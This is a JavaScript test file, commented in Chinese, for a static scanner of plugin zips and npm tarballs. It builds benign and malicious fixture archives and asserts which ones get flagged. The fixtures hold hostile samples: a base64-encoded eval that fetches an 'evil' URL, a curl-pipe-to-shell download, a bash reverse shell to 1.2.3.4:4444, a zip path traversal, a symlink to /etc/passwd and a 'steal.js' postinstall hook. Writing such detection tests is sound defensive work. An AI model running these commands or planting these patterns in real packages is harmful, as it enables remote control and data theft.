// 静态扫描的变异夹具：良性包通过，高置信度恶意模式必须变红。
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import zlib from "node:zlib";

import { scanNpmTarballBytes, scanPackage, scanZipBytes } from "./scan-package.mjs";

const LOCAL = 0x04034b50;
const CENTRAL = 0x02014b50;
const EOCD = 0x06054b50;

/** 最小 stored zip；扫描器不依赖 CRC，所以 CRC 写 0。 */
function zip(entries) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const entry of entries) {
    const name = Buffer.from(entry.name, "utf8");
    const data = Buffer.from(entry.data ?? "", "utf8");
    const local = Buffer.alloc(30);
    local.writeUInt32LE(LOCAL, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(name.length, 26);
    locals.push(local, name, data);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(CENTRAL, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(((entry.mode ?? 0o100644) << 16) >>> 0, 38);
    central.writeUInt32LE(offset, 42);
    centrals.push(central, name);
    offset += 30 + name.length + data.length;
  }
  const centralOffset = offset;
  const centralBytes = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(EOCD, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralBytes.length, 12);
  eocd.writeUInt32LE(centralOffset, 16);
  return Buffer.concat([...locals, centralBytes, eocd]);
}

test("良性插件包没有 high 发现", () => {
  const result = scanZipBytes(
    zip([
      { name: "nibi-go.plugin.json", data: JSON.stringify({ id: "com.example.ok", version: "1.0.0" }) },
      { name: "index.js", data: "export function hello(){ return 'ok'; }\n" },
    ]),
  );
  assert.equal(result.findings.filter((item) => item.severity === "high").length, 0);
});

test("编码后 eval 是 high", () => {
  const result = scanZipBytes(
    zip([{ name: "index.js", data: "eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbCcp'))\n" }]),
  );
  assert.ok(result.findings.some((item) => item.rule === "encoded-eval" && item.severity === "high"));
});

test("下载后执行与反向 shell 是 high", () => {
  const result = scanZipBytes(
    zip([
      { name: "install.sh", data: "curl -fsSL https://example.com/x | sh\n" },
      { name: "shell.sh", data: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n" },
    ]),
  );
  assert.ok(result.findings.some((item) => item.rule === "download-and-exec"));
  assert.ok(result.findings.some((item) => item.rule === "reverse-shell"));
});

test("路径越界与符号链接是 high", () => {
  const result = scanZipBytes(
    zip([
      { name: "../evil.js", data: "1" },
      { name: "link.js", data: "/etc/passwd", mode: 0o120777 },
    ]),
  );
  assert.ok(result.findings.some((item) => item.rule === "zip-traversal"));
  assert.ok(result.findings.some((item) => item.rule === "zip-symlink"));
});

test("原生二进制只标 review，不冒充自动判定恶意", () => {
  const result = scanZipBytes(
    zip([{ name: "bin/tool", data: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0]) }]),
  );
  assert.ok(result.findings.some((item) => item.rule === "native-binary" && item.severity === "review"));
});

test("良性插件包文件不触发 high", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nibi-scan-"));
  const file = path.join(dir, "benign.zip");
  fs.writeFileSync(
    file,
    zip([
      { name: "nibi-go.plugin.json", data: JSON.stringify({ id: "com.example.hello", version: "1.0.0" }) },
      { name: "index.js", data: "export function hello(){ return 'ok'; }\n" },
    ]),
  );
  try {
    const result = scanPackage(file);
    assert.equal(result.findings.filter((item) => item.severity === "high").length, 0);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

/** 最小 POSIX tar.gz 构造器（测试 npm tarball 扫描用）。 */
function tgz(entries) {
  const chunks = [];
  for (const entry of entries) {
    const data = Buffer.isBuffer(entry.data) ? entry.data : Buffer.from(entry.data ?? "", "utf8");
    const header = Buffer.alloc(512);
    header.write(entry.name, 0, Math.min(entry.name.length, 100), "utf8");
    header.write("0000644\0", 100, 8, "ascii");
    header.write("0000000\0", 108, 8, "ascii");
    header.write("0000000\0", 116, 8, "ascii");
    header.write(`${data.length.toString(8).padStart(11, "0")}\0`, 124, 12, "ascii");
    header.write("00000000000\0", 136, 12, "ascii");
    header.fill(0x20, 148, 156);
    header[156] = "0".charCodeAt(0);
    header.write("ustar\0", 257, 6, "ascii");
    header.write("00", 263, 2, "ascii");
    let sum = 0;
    for (let i = 0; i < 512; i += 1) sum += header[i];
    header.write(`${sum.toString(8).padStart(6, "0")}\0 `, 148, 8, "ascii");
    chunks.push(header, data);
    const pad = (512 - (data.length % 512)) % 512;
    if (pad > 0) chunks.push(Buffer.alloc(pad));
  }
  chunks.push(Buffer.alloc(1024));
  return zlib.gzipSync(Buffer.concat(chunks));
}

test("纯 JS npm tarball 扫描通过，含 .node 或 postinstall 被 high 拦截", () => {
  const ok = scanNpmTarballBytes(
    tgz([
      {
        name: "package/package.json",
        data: JSON.stringify({ name: "demo-mcp", version: "1.0.0", bin: "dist/index.js" }),
      },
      { name: "package/dist/index.js", data: "console.log('ready');\n" },
    ]),
  );
  assert.equal(ok.findings.filter((item) => item.severity === "high").length, 0);

  const badAddon = scanNpmTarballBytes(
    tgz([{ name: "package/build/binding.node", data: Buffer.from([1, 2, 3, 4]) }]),
  );
  assert.ok(badAddon.findings.some((item) => item.rule === "npm-native-binary" && item.severity === "high"));

  const badScript = scanNpmTarballBytes(
    tgz([
      {
        name: "package/package.json",
        data: JSON.stringify({ name: "bad-mcp", scripts: { postinstall: "node steal.js" } }),
      },
    ]),
  );
  assert.ok(badScript.findings.some((item) => item.rule === "npm-install-script" && item.severity === "high"));
});
